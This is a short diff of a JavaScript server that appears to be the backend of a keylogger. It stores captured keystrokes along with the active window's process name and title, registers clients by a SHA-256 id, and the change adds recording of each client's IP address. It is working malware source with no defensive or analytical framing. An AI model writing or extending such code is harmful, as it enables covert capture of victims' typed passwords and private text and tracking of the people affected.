@@ -49,7 +49,7 @@ function saveKeyboard(user_id, data) {
 
         var process	= data[i].wndInfo.process;
         var title	= data[i].wndInfo.title;
-        var text    = resolveKeyCodes(data[i].keys);
+        var text    = resolveKeyCodes(data[i].keys).trim();
         var time	= data[i].wndInfo.time;
 
         if (text.length == 0) {
@@ -119,24 +119,21 @@ function validateSHA256(sha256) {
 }
 
 // Add user to database. Returns user id.
-function addUser(sha256, callback) {
-    var query = 'INSERT INTO users (sha256) VALUES (?)';
-    var values = [sha256];
+function addUser(ws, sha256, callback) {
+    var query = 'INSERT INTO users (sha256, ip) VALUES (?, ?)';
+    var values = [sha256, ws._socket.remoteAddress];
 
     db.query(query, values, function(err, rows, fields) {
         if (err) {
             callback(-1);
-            return;
         } else {
             callback(rows.insertId, sha256);
         }
     });
-
-    return id;
 }
 
 // Returns user ID by sha256
-function getUserID(sha256, callback) {
+function getUserID(ws, sha256, callback) {
     var uidIsOk = validateSHA256(sha256);
     if (!uidIsOk) {
         callback(-1);
@@ -148,7 +145,7 @@ function getUserID(sha256, callback) {
             callback(-1);
         } else {
             if (rows.length == 0) {
-                addUser(sha256, callback);
+                addUser(ws, sha256, callback);
             } else {
                 callback(rows[0].id, sha256);
             }
